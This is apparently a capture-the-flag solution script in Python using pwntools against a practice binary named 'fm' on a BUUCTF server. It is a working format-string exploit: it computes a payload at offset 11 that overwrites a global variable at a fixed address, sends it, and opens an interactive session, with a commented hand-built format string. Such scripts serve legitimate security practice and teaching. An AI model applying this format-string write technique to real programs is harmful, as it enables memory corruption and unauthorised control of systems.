from pwn import *

io = process('./fm')
io = remote('node4.buuoj.cn',26514)
elf = ELF('./fm')

# def exec_fmt(payload):
#     io.sendline(payload)
#     info = io.recv()
#     return info
# auto = FmtStr(exec_fmt)
# offset = auto.offset
# print(offset)
offset = 11
x_addr = 0x0804A02C

payload = fmtstr_payload(offset,{x_addr:4})
print(payload)
io.sendline(payload)
io.interactive()
# %4c%13$n,\xa0\x04\x08